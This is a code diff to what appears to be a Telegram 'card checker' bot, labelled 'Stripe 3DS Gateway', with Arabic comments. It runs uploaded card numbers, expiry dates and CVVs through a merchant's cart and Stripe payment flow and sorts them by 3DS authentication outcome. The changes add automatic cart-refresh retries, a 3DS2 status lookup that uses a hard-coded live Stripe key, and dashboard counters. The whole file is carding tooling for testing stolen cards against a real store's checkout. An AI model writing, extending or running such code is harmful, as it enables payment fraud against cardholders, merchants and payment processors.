@@ -189,6 +189,7 @@ stats = {
     'declined': 0,
     'errors': 0,
     'cart_refreshed': 0,
+    'cart_refresh_failed': 0,
     'start_time': None,
     'is_running': False,
     'dashboard_message_id': None,
@@ -211,7 +212,7 @@ class StripeChecker:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
         }
         
-    def check(self, card_number, exp_month, exp_year, cvv, retry_count=0):
+    def check(self, card_number, exp_month, exp_year, cvv, retry_count=0, max_retries=3):
         global CART_ID
         
         try:
@@ -378,8 +379,19 @@ class StripeChecker:
                 )
                 logger.info(f"✅ Shipping set: {r_shipping.status_code}")
                 
-                if r_shipping.status_code != 200:
-                    logger.warning(f"⚠️ Shipping failed: {r_shipping.text[:200]}")
+                if r_shipping.status_code == 404:
+                    logger.warning("⚠️ Cart expired during shipping setup")
+                    
+                    # محاولة تجديد السلة
+                    if retry_count < max_retries:
+                        new_cart_id = get_quote_id_smart()
+                        if new_cart_id:
+                            logger.info(f"✅ Cart refreshed: {new_cart_id[:20]}...")
+                            stats['cart_refreshed'] += 1
+                            time.sleep(2)
+                            return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
+                    
+                    return 'ERROR', '⚠️ Cart expired'
                     
             except Exception as e:
                 logger.warning(f"⚠️ Shipping method error: {e}")
@@ -427,23 +439,36 @@ class StripeChecker:
                 
                 # إذا كان الخطأ متعلق بالسلة
                 if any(keyword in error_text.lower() for keyword in ['no such entity', 'not found', 'cart', 'quote']):
-                    logger.warning("⚠️ Cart ID expired! Attempting to refresh...")
+                    logger.warning(f"⚠️ Cart ID expired! Attempt {retry_count + 1}/{max_retries}")
                     
-                    # محاولة واحدة فقط لتجديد السلة
-                    if retry_count == 0:
+                    # محاولة حتى max_retries مرات
+                    if retry_count < max_retries:
+                        logger.info("🔄 Attempting to refresh cart...")
                         new_cart_id = get_quote_id_smart()
                         
                         if new_cart_id:
-                            logger.info(f"✅ تم تحديث Cart ID: {new_cart_id}")
+                            logger.info(f"✅ Cart refreshed successfully: {new_cart_id[:20]}...")
                             stats['cart_refreshed'] += 1
                             
+                            # انتظار ثانيتين قبل إعادة المحاولة
+                            time.sleep(2)
+                            
                             # إعادة المحاولة مع السلة الجديدة
-                            return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
+                            return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                         else:
-                            logger.error("❌ فشل تحديث السلة")
-                            return 'ERROR', '⚠️ Cart refresh failed'
+                            logger.error("❌ Failed to refresh cart")
+                            
+                            # محاولة أخرى بعد 5 ثواني
+                            if retry_count < max_retries - 1:
+                                logger.info("⏳ Waiting 5 seconds before retry...")
+                                time.sleep(5)
+                                return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
+                            else:
+                                stats['cart_refresh_failed'] += 1
+                                return 'ERROR', '⚠️ Cart refresh failed after multiple attempts'
                     else:
-                        return 'ERROR', '⚠️ Cart still invalid after refresh'
+                        stats['cart_refresh_failed'] += 1
+                        return 'ERROR', f'⚠️ Max retries ({max_retries}) reached'
                 
                 if 'shipping address is missing' in error_text.lower():
                     return 'ERROR', '⚠️ Shipping address error'
@@ -603,7 +628,74 @@ class StripeChecker:
                         if final_status == 'succeeded':
                             return 'Y', '✅ Payment succeeded'
                         elif final_status == 'requires_action':
-                            # لا يزال يحتاج إجراء - ربما Challenge
+                            # التحقق من next_action للتأكد من نوع الإجراء المطلوب
+                            if 'next_action' in confirmed_pi:
+                                next_action = confirmed_pi['next_action']
+                                if 'use_stripe_sdk' in next_action:
+                                    sdk_data = next_action['use_stripe_sdk']
+                                    
+                                    # محاولة الحصول على تفاصيل 3DS
+                                    if 'stripe_js' in sdk_data:
+                                        stripe_js = sdk_data.get('stripe_js', '')
+                                        logger.info(f"🔐 Stripe JS: {stripe_js[:50]}...")
+                                    
+                                    # نحاول الحصول على حالة 3DS الفعلية
+                                    three_ds_source = sdk_data.get('three_d_secure_2_source', '')
+                                    if three_ds_source:
+                                        # نحاول الحصول على تفاصيل الـ 3DS source
+                                        try:
+                                            headers_3ds = self.headers.copy()
+                                            headers_3ds.update({
+                                                'origin': 'https://js.stripe.com',
+                                                'referer': 'https://js.stripe.com/',
+                                            })
+                                            
+                                            params_3ds = {
+                                                'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X',
+                                            }
+                                            
+                                            r_3ds = self.session.get(
+                                                f'https://api.stripe.com/v1/3ds2/sources/{three_ds_source}',
+                                                params=params_3ds,
+                                                headers=headers_3ds,
+                                                timeout=15
+                                            )
+                                            
+                                            if r_3ds.status_code == 200:
+                                                three_ds_data = r_3ds.json()
+                                                logger.info(f"🔐 3DS Data: {three_ds_data}")
+                                                
+                                                # التحقق من الحالة الفعلية
+                                                if 'ares' in three_ds_data:
+                                                    trans_status = three_ds_data['ares'].get('transStatus', 'UNKNOWN')
+                                                    logger.info(f"🎯 Real 3DS Status: {trans_status}")
+                                                    
+                                                    # استخدام الحالة الحقيقية
+                                                    status_map = {
+                                                        'Y': ('Y', '✅ Authenticated - Full verification'),
+                                                        'C': ('C', '⚠️ Challenge Required'),
+                                                        'A': ('A', '🔵 Attempted Authentication'),
+                                                        'N': ('N', '❌ Not Authenticated'),
+                                                        'U': ('U', '🔴 Unavailable'),
+                                                        'R': ('DECLINED', '❌ Rejected by issuer'),
+                                                    }
+                                                    
+                                                    if trans_status in status_map:
+                                                        result = status_map[trans_status]
+                                                        logger.info(f"✅ Final: {result[0]} - {result[1]}")
+                                                        return result
+                                                
+                                                # التحقق من state
+                                                state = three_ds_data.get('state', 'unknown')
+                                                if state == 'failed':
+                                                    return 'DECLINED', '❌ 3DS Failed'
+                                                elif state == 'succeeded':
+                                                    return 'Y', '✅ 3DS Succeeded'
+                                        
+                                        except Exception as e:
+                                            logger.warning(f"⚠️ Could not fetch 3DS details: {e}")
+                            
+                            # إذا لم نحصل على تفاصيل، نفترض أنه Challenge
                             return 'C', '⚠️ Challenge Required'
                         elif final_status == 'requires_payment_method':
                             return 'DECLINED', '❌ Card declined'
@@ -713,21 +805,21 @@ class StripeChecker:
                         logger.error(f"❌ Unknown status: {trans_status}")
                         return ('DECLINED', f'Unknown: {trans_status}')
                 
-                if 'error' in auth:
-                    error_msg = auth['error'].get('message', 'Unknown')
-                    logger.error(f"❌ 3DS Error: {error_msg}")
-                    return 'DECLINED', f'Error: {error_msg[:50]}'
-                
-                state = auth.get('state', 'unknown')
-                logger.info(f"📊 State: {state}")
-                
-                if state == 'failed':
-                    return 'DECLINED', 'Authentication failed'
-                elif state == 'succeeded':
-                    return 'Y', 'Authentication succeeded'
-                
-                logger.error(f"❌ Unexpected state: {state}")
-                return 'DECLINED', f'State: {state}'
+                # التحقق من state إذا لم يكن هناك ares
+                if 'state' in auth:
+                    state = auth.get('state', 'unknown')
+                    logger.info(f"📊 State: {state}")
+                    
+                    if state == 'failed':
+                        # محاولة استخراج السبب
+                        if 'error' in auth:
+                            error_msg = auth['error'].get('message', 'Authentication failed')
+                            return 'DECLINED', f'❌ {error_msg[:50]}'
+                        return 'DECLINED', 'Authentication failed'
+                    elif state == 'succeeded':
+                        return 'Y', 'Authentication succeeded'
+                    else:
+                        return 'DECLINED', f'State: {state}'
             
             else:
                 logger.error("❌ No 3DS method found")
@@ -881,9 +973,12 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors"),
-            InlineKeyboardButton(f"🔄 Cart Refresh: {stats['cart_refreshed']}", callback_data="cart_refresh")
+            InlineKeyboardButton(f"🔄 Cart OK: {stats['cart_refreshed']}", callback_data="cart_refresh")
         ],
-        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
+        [
+            InlineKeyboardButton(f"❌ Cart Failed: {stats['cart_refresh_failed']}", callback_data="cart_failed"),
+            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
+        ]
     ]
     
     if stats['is_running']:
@@ -1008,6 +1103,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'declined': 0,
         'errors': 0,
         'cart_refreshed': 0,
+        'cart_refresh_failed': 0,
         'current_card': '',
         'last_response': 'Starting...',
         'cards_checked': 0,
@@ -1081,8 +1177,10 @@ async def process_cards(cards, bot_app):
         f"❌ Not Auth (N): {stats['not_auth']}\n"
         f"🔴 Unavailable (U): {stats['unavailable']}\n"
         f"❌ Declined/Rejected: {stats['declined']}\n"
-        f"⚠️ Errors: {stats['errors']}\n"
-        f"🔄 Cart Refreshed: {stats['cart_refreshed']} times\n\n"
+        f"⚠️ Errors: {stats['errors']}\n\n"
+        f"**🔄 إحصائيات السلة:**\n"
+        f"✅ تحديثات ناجحة: {stats['cart_refreshed']}\n"
+        f"❌ تحديثات فاشلة: {stats['cart_refresh_failed']}\n\n"
         "📁 **جاري إرسال الملفات...**"
     )
     
@@ -1098,8 +1196,10 @@ async def process_cards(cards, bot_app):
         "╔═══════════════════════╗\n"
         "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
         "╚═══════════════════════╝\n\n"
-        "✅ تم إرسال جميع الملفات\n"
-        f"🔄 تم تحديث السلة {stats['cart_refreshed']} مرة\n"
+        "✅ تم إرسال جميع الملفات\n\n"
+        f"**📊 ملخص السلة:**\n"
+        f"🔄 تحديثات ناجحة: {stats['cart_refreshed']}\n"
+        f"❌ تحديثات فاشلة: {stats['cart_refresh_failed']}\n"
         f"🛒 Cart ID النهائي: `{CART_ID}`\n\n"
         "📊 شكراً لاستخدامك البوت!\n"
         "⚡️ Stripe 3DS Gateway"
